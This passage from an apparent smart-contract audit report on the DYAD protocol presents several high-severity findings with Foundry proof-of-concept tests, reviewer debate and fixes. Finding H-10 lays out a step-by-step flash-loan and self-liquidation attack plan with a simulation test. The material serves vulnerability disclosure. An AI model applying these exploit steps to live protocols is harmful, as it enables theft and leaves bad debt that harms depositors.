@shafu0x - Could you please help with the severity assessment here?The impact is obviously high, However, I’m not sure about the likelihood.Here is an example, the user added extra kerosene (i.e. above 50%):A user added 110% value of non-kerosene+60% value of kerosene=>CR 170% .Non-kerosene value drops below 100%, let’s say 90%.Now, we have 90% value of non-kerosene+60% value of kerosene=>CR 150%.Liquidation is reverting.Another scenario, would be that the kerosene added by the user is equal or less than 50%, and the price of kerosene goes up enough to cover 150% as CR.So, likelihood depends on two events:Amount of kerosene has to be above 50%.Price of kerosene going up.Given the info above, would you say the likelihood is low, medium or high?
shafu0x (DYAD) commented:
As @0xMax1 mentioned, we fix this by also moving kerosene in the case of a liquidation. I think this should fix it.
Koolex (judge) commented:
The liquidation will revert if CR>=1.5 but the non-kerosene collateral value is less than 100%. So, minted dyad is not backed by (at least) 100% of non-kerosene collateral.After discussing the likelihood of this with the sponsor, I believe the issue stands as high.
adam-idarrha (warden) commented:
This issue should be invalid. The issue is about the state where positions have exogenous collateral less than the DYAD minted, suggesting such positions should be liquidated. However, the protocol specifications do not mandate liquidation under these circumstances if the position remains overall sufficiently collateralized with kerosene.
T1MOH (warden) commented:
Protocol docsstate:If a Note’s collateral value in USD drops below 150% of its DYAD minted balance, it faces liquidation.There is no mention that position is subject to liquidation whenexogenous collateral < DYAD minted.
Yes there is that check inwithdraw()andmintDyad(), but from reviewer’s perspective it is no more than sanity check. Because bypassing this check as it is doesn’t harm protocol due to the nature of Kerosine price (it has valuation of surplus collateral).
That’s because if someone has say 90% of exogenous collateral and 60% of Kerosine, then somebody else has more than 100% in exogenous collateral and protocol is totally fine. As noted before, Kerosine has value only if there is surplus collateral in protocol. I think submission is invalid.
McToady (warden) commented:
The core invariant of the protocol isTVL (which is measured as the non Kerosene collateral) > DYAD total supplyPositions being able to fall below a 1:1 exogenous collateral to dyad minted ratio allows for the protocol to break it’s core invariant meaning this is a valid issue regardless of the sponsors intentions.As pointed out in issue#1027, as the value of the collateral in the protocol is all significantly correlated (to the price of ETH), a significant drop in ETH price can cause a large % of open positions to drop below this 1:1 ratio; meaning it becomes very likely this core invariant is broken.
Abdessamed (warden) commented:
The confusion around this issue is that it didn’t succeed in combining two findings.
There are two invariants related to minting/liquidating DYAD:When minting DYAD, the ratio 1:1 ofexogenous value with dyad mintedshould hold.When liquidating DYAD, the 150% ratio ofUSD collateral value (not exogenous collaterals only)should hold.This issue does not highlight the first invariant. It only talks about liquidation and it assumes that if the USD value ofexogenous collateraldrops below a 1:1 ratio, liquidation should happen, while this is a wrong assumption.Liquidation should happen if the total collateral USD value (including both exogenous and kerosene tokens) drops below 150%However, the first invariant (when minting DYAD, a 1:1 ratio should hold) is a valid finding as it demonstrates a core invariant break, but it is not highlighted in this issue.
McToady (warden) commented:
The core invariant of the whole protocol is that total TVL does not drop below total Dyad minted. Being able to liquidate positions that have fallen below the 1:1 ratio is merely a mitigation to protect the protocol from this happening.Given there is no option to post collateral in non-ETH sources (other stable coins), if ETH price were to drop & TVL to fall below DYAD minted it would lead to the stablecoin to depegging as it would no longer be backed 1:1. Being able to liquidate positions with less than a 1:1 ratio is more a mitigation to protect the health of the entire protocol rather than a bug in itself.
Koolex (judge) commented:
This issue stays as a valid high since the core invariant in the protocol can be broken leading to DYAD’s depeg.
Note: For full discussion, seehere.

[H-08] Users can get their Kerosene stuck until TVL becomes greater than Dyad’s supply
Submitted by0xAlix2, also found byNentoR, Abdessamed (1,2),DarkTower,0xlucky,CodeWasp, sashik_eth (1,2,3),Egis_Security,Maroutis,TheFabled, 0xabhay (1,2), itsabinashb (1,2),Infect3d,windhustler,btk,Limbooo,KupiaSec, SpicyMeatball (1,2),imare,Circolors,gumgumzum,web3km,n4nika,0xtankr,cu5t0mpeo,Ryonen,ke1caM,oakcobalt,TheSchnilch,XDZIBECX,steadyman,VAD37,shaflow2,lian886,iamandreiski,dimulski, 0x486776 (1,2),Giorgio,T1MOH,kennedy1030,TheSavageTeddy,carrotsmuggler, zhaojohnson (1,2), andKrace
The protocol expects users to migrate their collateral from V1 vaults to V2 vaults, this significantly increases the TVL of the protocol’s V2. At the same time, the Kerosene price depends on the TVL, inUnboundedKerosineVault::assetPricethe numerator of the equation is:
uint256 numerator = tvl - dyad.totalSupply();
This will always revert until the TVL becomes>Dyad’s supply, which is around 600k. So when users deposit Kerosene in either Kerosene vaults their Kerosene will temporarily get stuck in there.
Proof of Concept
This assumes that a reported bug is fixed, which is using the correct licenser. To overcome this, we had to manually change the licenser inaddKeroseneandgetKeroseneValue.
Because of another reported issue, a small change should be made to the code to workaround it, inVaultManagerV2::withdraw, replace_vault.oracle().decimals()with8. This just sets the oracle decimals to a static value of 8.
Test POC:
Make sure to fork the main net and set the block number to19703450:
contract VaultManagerTest is VaultManagerTestHelper {Kerosine keroseneV2;Licenser vaultLicenserV2;VaultManagerV2 vaultManagerV2;Vault ethVaultV2;VaultWstEth wstEthV2;KerosineManager kerosineManagerV2;UnboundedKerosineVault unboundedKerosineVaultV2;BoundedKerosineVault boundedKerosineVaultV2;KerosineDenominator kerosineDenominatorV2;OracleMock wethOracleV2;address bob = makeAddr("bob");address alice = makeAddr("alice");ERC20 wrappedETH = ERC20(MAINNET_WETH);ERC20 wrappedSTETH = ERC20(MAINNET_WSTETH);DNft dNFT = DNft(MAINNET_DNFT);function setUpV2() public {(Contracts memory contracts, OracleMock newWethOracle) = new DeployV2().runTestDeploy();keroseneV2 = contracts.kerosene;vaultLicenserV2 = contracts.vaultLicenser;vaultManagerV2 = contracts.vaultManager;ethVaultV2 = contracts.ethVault;wstEthV2 = contracts.wstEth;kerosineManagerV2 = contracts.kerosineManager;unboundedKerosineVaultV2 = contracts.unboundedKerosineVault;boundedKerosineVaultV2 = contracts.boundedKerosineVault;kerosineDenominatorV2 = contracts.kerosineDenominator;wethOracleV2 = newWethOracle;vm.startPrank(MAINNET_OWNER);Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(vaultManagerV2));boundedKerosineVaultV2.setUnboundedKerosineVault(unboundedKerosineVaultV2);vm.stopPrank();}function test_InvalidCalculationAssetPrice() public {setUpV2();deal(MAINNET_WETH, bob, 100e18);vm.prank(MAINNET_OWNER);keroseneV2.transfer(bob, 100e18);uint256 bobNFT = dNFT.mintNft{value: 1 ether}(bob);vm.startPrank(bob);wrappedETH.approve(address(vaultManagerV2), type(uint256).max);keroseneV2.approve(address(vaultManagerV2), type(uint256).max);vaultManagerV2.add(bobNFT, address(ethVaultV2));vaultManagerV2.addKerosene(bobNFT, address(unboundedKerosineVaultV2));vaultManagerV2.deposit(bobNFT, address(ethVaultV2), 1e18);vaultManagerV2.deposit(bobNFT, address(unboundedKerosineVaultV2), 1e18);vm.roll(1);vm.expectRevert(); // UnderflowvaultManagerV2.withdraw(bobNFT, address(unboundedKerosineVaultV2), 1e18, bob);}}
Recommended Mitigation Steps
This is a bit tricky, but I think the most straightforward and logical solution would be to block the usage of the Kerosene vaults (just keep them unlicensed) until enough users migrate their positions from V1, i.e. the TVL reaches the Dyad’s total supply.
Assessed type
Under/Overflow
shafu0x (DYAD) confirmed and commented:
Yes, it should only check for dyad minted from v1.

[H-09] Kerosene collateral is not being moved on liquidation, exposing liquidators to loss
Submitted by0xAlix2, also found byfalconhoof,0x175,pontifex,DedOhWale,Emmanuel,Honour,Myrault,vahdrak1,SBSecurity,sashik_eth,koo,Vasquez,miaowu,Giorgio,Maroutis,Stefanov,KupiaSec,Aamir,Circolors,3th,ducanh2706,Jorgect,ke1caM,ljj,VAD37,0xnev,shikhar229169,lian886,adam-idarrha,iamandreiski,alix40,Angry_Mustache_Man,AlexCzm,kennedy1030,3docSec,Abdessamed,0x486776, andT1MOH
When a position’s collateral ratio drops below 150%, it is subject to liquidation. Upon liquidation, the liquidator burns a quantity of DYAD equal to the target Note’s DYAD minted balance, and in return receives an equivalent value plus a 20% bonus of the liquidated position’s collateral. If the collateral ratio is<100%, all the position’s collateral should be moved to the liquidator, this logic is done inVaultManagerV2::liquidate.
However, that function is only moving the non-Kerosene collateral to the liquidator, which is wrong. All collateral including Kerosene should be moved to the liquidator in the case of full liquidation.
This will affect both the liquidated and liquidator positions:
Liquidator position will be exposed to loss, as he’ll pay some Dyad and won’t get enough collateral in return.Liquidated position will end up with some collateral after being fully liquidated, where it should end up with 0 collateral of both types.
Proof of Concept
This assumes that a reported bug is fixed, which is using the correct licenser. To overcome this, we had to manually change the licenser inaddKeroseneandgetKeroseneValue.
Make sure to fork the main net and set the block number to19703450:
contract VaultManagerTest is VaultManagerTestHelper {Kerosine keroseneV2;Licenser vaultLicenserV2;VaultManagerV2 vaultManagerV2;Vault ethVaultV2;VaultWstEth wstEthV2;KerosineManager kerosineManagerV2;UnboundedKerosineVault unboundedKerosineVaultV2;BoundedKerosineVault boundedKerosineVaultV2;KerosineDenominator kerosineDenominatorV2;OracleMock wethOracleV2;address bob = makeAddr("bob");address alice = makeAddr("alice");ERC20 wrappedETH = ERC20(MAINNET_WETH);ERC20 wrappedSTETH = ERC20(MAINNET_WSTETH);DNft dNFT = DNft(MAINNET_DNFT);function setUpV2() public {(Contracts memory contracts, OracleMock newWethOracle) = new DeployV2().runTestDeploy();keroseneV2 = contracts.kerosene;vaultLicenserV2 = contracts.vaultLicenser;vaultManagerV2 = contracts.vaultManager;ethVaultV2 = contracts.ethVault;wstEthV2 = contracts.wstEth;kerosineManagerV2 = contracts.kerosineManager;unboundedKerosineVaultV2 = contracts.unboundedKerosineVault;boundedKerosineVaultV2 = contracts.boundedKerosineVault;kerosineDenominatorV2 = contracts.kerosineDenominator;wethOracleV2 = newWethOracle;vm.startPrank(MAINNET_OWNER);Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(vaultManagerV2));boundedKerosineVaultV2.setUnboundedKerosineVault(unboundedKerosineVaultV2);vm.stopPrank();}function test_NonKeroseneNotMovedOnLiquidate() public {setUpV2();deal(MAINNET_WETH, bob, 100e18);deal(MAINNET_WSTETH, alice, 100e18);deal(MAINNET_WETH, address(ethVaultV2), 10_000e18);vm.prank(MAINNET_OWNER);keroseneV2.transfer(bob, 100e18);uint256 bobNFT = dNFT.mintNft{value: 1 ether}(bob);uint256 aliceNFT = dNFT.mintNft{value: 1 ether}(alice);// Bob adds Weth vault and Bounded Kerosene vault to his NFT// Bob deposits 1 Weth and 1 Kerosene// Bob mints 2,100 Dyadvm.startPrank(bob);wrappedETH.approve(address(vaultManagerV2), type(uint256).max);keroseneV2.approve(address(vaultManagerV2), type(uint256).max);vaultManagerV2.addKerosene(bobNFT, address(boundedKerosineVaultV2));vaultManagerV2.add(bobNFT, address(ethVaultV2));vaultManagerV2.deposit(bobNFT, address(boundedKerosineVaultV2), 1e18);vaultManagerV2.deposit(bobNFT, address(ethVaultV2), 1e18);vaultManagerV2.mintDyad(bobNFT, 2_100e18, bob);vm.stopPrank();// Alice adds WstEth vault and Weth vault to her NFT// Alice deposits 1.3 WstEth// Alice mints 3,000 Dyadvm.startPrank(alice);wrappedSTETH.approve(address(vaultManagerV2), type(uint256).max);vaultManagerV2.addKerosene(aliceNFT, address(boundedKerosineVaultV2));vaultManagerV2.add(aliceNFT, address(wstEthV2));vaultManagerV2.add(aliceNFT, address(ethVaultV2));vaultManagerV2.deposit(aliceNFT, address(wstEthV2), 1.3e18);vaultManagerV2.mintDyad(aliceNFT, 3_000e18, alice);vm.stopPrank();// Bob not liquidatableassertGt(vaultManagerV2.collatRatio(bobNFT), vaultManagerV2.MIN_COLLATERIZATION_RATIO());// Weth price drops downwethOracleV2.setPrice(wethOracleV2.price() / 2);// Bob liquidatableassertLt(vaultManagerV2.collatRatio(bobNFT), vaultManagerV2.MIN_COLLATERIZATION_RATIO());// Bob's position collateral ratio is less than 100% => All collateral should be movedassertLt(vaultManagerV2.collatRatio(bobNFT), 1e18);// Alice liquidates Bob's positionvm.prank(alice);vaultManagerV2.liquidate(bobNFT, aliceNFT);// Bob loses all non-Kerosene collateral, but keeps Kerosene collateralassertEq(vaultManagerV2.getNonKeroseneValue(bobNFT), 0);assertGt(vaultManagerV2.getKeroseneValue(bobNFT), 0);}}
Recommended Mitigation Steps
Add the following toVaultManagerV2::liquidate:
uint256 numberOfKeroseneVaults = vaultsKerosene[id].length();for (uint256 i = 0; i < numberOfKeroseneVaults; i++) {Vault vault = Vault(vaultsKerosene[id].at(i));uint256 collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);vault.move(id, to, collateral);}
Assessed type
Error
shafu0x  (DYAD) confirmed

[H-10] Flash loan protection mechanism can be bypassed via self-liquidations
Submitted bycarrotsmuggler, also found byZanyBonzy,TheSavageTeddy,adam-idarrha,Emmanuel,Al-Qa-qa,alix40,TheFabled, andlian886
https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/Vault.kerosine.sol#L47-L59
https://github.com/code-423n4/2024-04-dyad/blob/44becc2f09c3a75bd548d5ec756a8e88a345e826/src/core/VaultManagerV2.sol#L225-L226
Impact
The protocol implements a flash-loan manipulation protection mechanism with theidToBlockOfLastDepositvariable. This values is set to the current block number during a deposit, and is checked during a withdrawal. If the system detects a deposit and withdrawal in the same block, the system reverts the transaction.
//function depositidToBlockOfLastDeposit[id] =block.number;//function withdrawif(idToBlockOfLastDeposit[id] ==block.number)revertDepositedInSameBlock();
The issue is that there is another way to move funds around: liquidations. This calls themovefunction to transfer around the balances, and does not update theidToBlockOfLastDepositof the receiving account.
functionliquidate(uintid,uintto){//...vault.move(id,to,collateral);//...}
So, a user can:
Take out a flashloan. Deposit funds into a vault A. Mint dyad.Manipulate the price of kerosene to trigger a liquidation.Liquidate themselves and send their collateral to vault B.Withdraw from vault B in the same block.Pay off their flashloans.
The step 2 involves manipulating the price of kerosene, which affects their collateralization ratio. This has been discussed in a separate issue, and mainly states that if the user mints more dyad against free collateral in the system, or if any user takes out free collateral in the system, the price of kerosene will fall.
The flaw being discussed in this report is that the flash loan protection mechanism can be bypassed. This is different from the price manipulation issue and is thus a separate issue. Since this bypasses one of the primary safeguards in the system, this is a high severity issue.
Proof of Concept
The POC exploit setup requires 4 accounts: A, B, C and D:
A is where the flashed funds will be deposited to.B is where the liquidated funds will be deposited to.C is for manipulating the kerosene price.D is for minting dyad at manipulated price to accrue bad debt in the system.
Where:
A is used toinflatethe price of kerosene.B is used to bypass the flash loan protection mechanism.C is used todeflatethe price of kerosene.D is used to mint dyad at theinflatedprice, accruing bad debt in the system and damaging the protocol.
Assume C has 1 million usdc tokens with0debt. C inflates the price of kerosene up by contributing to TVL, and will be used later to push the price down.Alice takes out a flashloan of 10 million usdc tokens. She deposits them in account A.Due to the sudden addedmassiveflashloaned TVL, the internal price of kerosene shoots up.Alice uses account D to mint out dyad tokens at this condition. Alice can now mint out exactly as many dyad tokens as her exo collateral. This is allowed since the price of kerosene is inflated, which covers the collateralization ratio. Alice effectively has a CR of close to 1.0 but the system thinks it’s 1.5 due to kerosene being overvalued. The system is still solvent at this point.Alice buys kerosene from the market and adds it in account A and then mints dyad until account A has a CR of 1.5. The actual CR of A ignoring kerosene is close to 1.0.Alice now removes collateral from account C. This reduces the price of C, making Account A liquidatable.Alice now liquidates account A and sends the collateral to account B. This inflates the price of kerosene again since dyad supply has gone down, and she can repeat steps 5-6 multiple times since she can now mint more dyad tokens again.Alice gets a large portion of her flashed funds into account B She withdraws them back out. This again drops the price of kerosene, allowing her to liquidate A more and and recover more of her funds into account B.Alice pays back her flashloan.Account D is now left with a CR close to 1.0, since the price of kerosene has now gone back to normal. Any price fluctuations in the exo collateral will now lead to bad debt.
This lets Alice open positions at a CR of close to 1.0. This is very dangerous in a CDP protocol, since Alice’s risk is very low as she can sell off the minted dyad to recover her investment, but the protocol is now at a very risky position, close to accruing bad debt. Thus this is a high severity issue.
Recommended Mitigation Steps
The flashloan protection can be bypassed. MEV liquidation bots rely on flashloans to carryout liquidations, so there isn’t a very good way to prevent this attack vector. Making the price of kerosene less manipulatable is a good way to lower this attack chance. However, the system will still be open to flashloan deposits via liquidations.
Incorporating a mint fee will also help mitigate this vector, since the attacker will have a higher cost to manipulate the system.
shafu0x (DYAD) confirmed
Koolex (judge) decreased severity to Medium and commented:
@carrotsmuggler - the attack assumes that kerosine is used within the CR. Could you please clarify how the attacker would acquire this big amount of kerosine?
carrotsmuggler (warden) commented:
@Koolex - kerosene can just be bought off of DEXs and other open markets. In this attack, kerosene is not being flashloaned. Kerosene is just required as an initial investment. USDC is flashloaned, and dyad tokens are minted against that up to a CR of 1.5, which drops to 1.0 once the value of kerosene drops.The point of the issue is to show that the flashloan protection can be bypassed, which is being done here by utilising multiple accounts.
Koolex (judge) commented:
@carrotsmuggler - I’m requesting a PoC (with code) in order to be able to evaluate the severity better. At the moment, the attack is too expensive since the attacker should hold a big amount of Kerosene, which practically difficult since  Kerosene is being distributed over 10 years. Unless there is a demonstrated impact on the protocol, this would be a QA.
carrotsmuggler (warden) commented:
The problem this issue addresses, is that the flash loan protection can be bypassed. For that, a POC is taken from the issue#537showing that self liquidation can be used to flash funds, manipulate the system, and then take them out in the same transaction.However, the main point of contention here seems to be the impact. Flashloans in general don’t do anything a well funded attacker cannot do on their own, and not an exploit on their own. However, they can be used to exacerbate an existing problem by anyone, well funded or not.To eradicate this vector, and to make the system less manipulatable, the devs had put in certain restrictions. This issue shows that these restrictions are insufficient. So users can use flashloans and thus a near infinite amount of funds to manipulate the system. This was reported since the devs had explicitly put up a counter to this.Since this breaks the safeguards put in place by the devs and makes the system more easily manipulatable, I believe this is of medium severity. This can be used in#67, but should not be a duplicate. This can also be abused to mint positions at 100% CR instead of 150% with a very large volume by anyone due to the flashloans, which makes the system way more unstable. Even small changes in price at that condition will be enough to cause bad debt to the system then.// SPDX-License-Identifier: MITpragmasolidity=0.8.17;import"forge-std/Test.sol";import"forge-std/console.sol";import{DeployBase,Contracts}from"../script/deploy/DeployBase.s.sol";import{Parameters}from"../src/params/Parameters.sol";import{DNft}from"../src/core/DNft.sol";import{Dyad}from"../src/core/Dyad.sol";import{Licenser}from"../src/core/Licenser.sol";import{VaultManagerV2}from"../src/core/VaultManagerV2.sol";import{Vault}from"../src/core/Vault.sol";import{OracleMock}from"./OracleMock.sol";import{ERC20Mock}from"./ERC20Mock.sol";import{IAggregatorV3}from"../src/interfaces/IAggregatorV3.sol";import{ERC20}from"@solmate/src/tokens/ERC20.sol";import{KerosineManager}from"../src/core/KerosineManager.sol";import{UnboundedKerosineVault}from"../src/core/Vault.kerosine.unbounded.sol";import{BoundedKerosineVault}from"../src/core/Vault.kerosine.bounded.sol";import{Kerosine}from"../src/staking/Kerosine.sol";import{KerosineDenominator}from"../src/staking/KerosineDenominator.sol";contractVaultManagerV2TestisTest,Parameters{DNftdNft;LicenservaultManagerLicenser;LicenservaultLicenser;Dyaddyad;VaultManagerV2vaultManagerV2;// wethVaultwethVault;ERC20Mockweth;OracleMockwethOracle;//KerosineKerosinekerosine;UnboundedKerosineVaultunboundedKerosineVault;KerosineManagerkerosineManager;KerosineDenominatorkerosineDenominator;//usersaddressuser1;addressuser2;functionsetUp()public{dNft=newDNft();weth=newERC20Mock("WETH-TEST","WETHT");wethOracle=newOracleMock(3000e8);vaultManagerLicenser=newLicenser();vaultLicenser=newLicenser();dyad=newDyad(vaultManagerLicenser);//vault Manager V2vaultManagerV2=newVaultManagerV2(dNft,dyad,vaultLicenser);//vaultwethVault=newVault(vaultManagerV2,ERC20(address(weth)),IAggregatorV3(address(wethOracle)));//kerosineManagerkerosineManager=newKerosineManager();kerosineManager.add(address(wethVault));vaultManagerV2.setKeroseneManager(kerosineManager);//kerosine tokenkerosine=newKerosine();//Unbounded KerosineVaultunboundedKerosineVault=newUnboundedKerosineVault(vaultManagerV2,kerosine,dyad,kerosineManager);//kerosineDenominatorkerosineDenominator=newKerosineDenominator(kerosine);unboundedKerosineVault.setDenominator(kerosineDenominator);//Licenser add vaultvaultLicenser.add(address(wethVault));vaultLicenser.add(address(unboundedKerosineVault));//vaultManagerLicenser add managervaultManagerLicenser.add(address(vaultManagerV2));}functiontestFlashLoanAttackUsingLiquidateSimulation()public{wethOracle.setPrice(1000e8);//1 The attacker prepares two NFTs ,some collateral and some Kerosene Token.uintid=mintDNft();uintid_for_liquidator=mintDNft();weth.mint(address(this),1e18);//2 deposit all the non-Kerosene collateral in the vault with One NFT like id=1vaultManagerV2.add(id_for_liquidator,address(wethVault));weth.approve(address(vaultManagerV2),1e18);vaultManagerV2.deposit(id_for_liquidator,address(wethVault),1e18);//3 In the next blocknumber, flashloan non-Kerosene collateral from Lending like Aave,vm.roll(block.number+1);weth.mint(address(this),1e18);//Simulation borrow 1 weth//deposit all the borrowed flashloan non-Kerosene collateral and Kerosene Token in the vault with One NFT like id=0vaultManagerV2.add(id,address(wethVault));weth.approve(address(vaultManagerV2),1e18);vaultManagerV2.deposit(id,address(wethVault),1e18);vaultManagerV2.addKerosene(id,address(unboundedKerosineVault));kerosine.approve(address(vaultManagerV2),1000_000_000e18);vaultManagerV2.deposit(id,address(unboundedKerosineVault),1000_000_000e18);//Mint the max number Dyad you canvaultManagerV2.mintDyad(id,1000e18,address(this));uint256cr=vaultManagerV2.collatRatio(id);//2e18assertEq(cr,2e18);//withdraw using id_for_liquidator,  manipulate the  Kerosene pricevaultManagerV2.withdraw(id_for_liquidator,address(wethVault),1e18,address(this));cr=vaultManagerV2.collatRatio(id);//1e18assertEq(cr,1e18);//liquidatevaultManagerV2.liquidate(id,id_for_liquidator);//withdraw the vault which is move from id  using id_for_liquidatorvaultManagerV2.withdraw(id_for_liquidator,address(wethVault),1e18,address(this));console.log("weth balance is ",weth.balanceOf(address(this))/1e18);}functionmintDNft()publicreturns(uint) {returndNft.mintNft{value:1ether}(address(this));}functiondeposit(ERC20Mocktoken,uintid,addressvault,uintamount)public{vaultManagerV2.add(id,vault);token.mint(address(this),amount);token.approve(address(vaultManagerV2),amount);vaultManagerV2.deposit(id,address(vault),amount);}receive()externalpayable{}functiononERC721Received(address,address,uint256,bytescalldata)externalpurereturns(bytes4) {return0x150b7a02;}}
adam-idarrha (warden) commented:
For the impact the sponsors stated quite clearly from the DYAD code4rena audit page that the main point of migrating fromvaultManagerV1toV2is the need for a flashloan protection mechanism, and the impact of the bypass is the ability to manipulate kerosene price which could lead to mass liquidations as discussed in separate issues:Attack ideas (where to focus for bugs).Manipulation of Kerosene Price.Flash Loan attacks.Migration.The goal is to migrate fromVaultManagertoVaultManagerV2. The main reason is the need for a flash loan protection which makes it harder to manipulate the deterministic Kerosene price.
Koolex (judge) increased severity to High and commented:
After reading all the comments above, I believe this should be a valid high due to the following reasons:Flash loan protection can be bypassed, since this didn’t exist in V1, it seems to me, it is a major change in V2.Price manipulation impact is demonstrated above, which is caused by utilising Flash loans.Flash loan attacks mentioned under Attack ideas of the audit page, obviously, the sponsor is interested in breaking this validation put in place.Not a dup of#6767’s attack is less accessible unlike with Flash loans where anyone can perform it.Furthermore, 67 isn’t necessarily to be performed as an attack, the event could occur naturally when whales intend to withdraw funds.
Note: For full discussion, seehere.

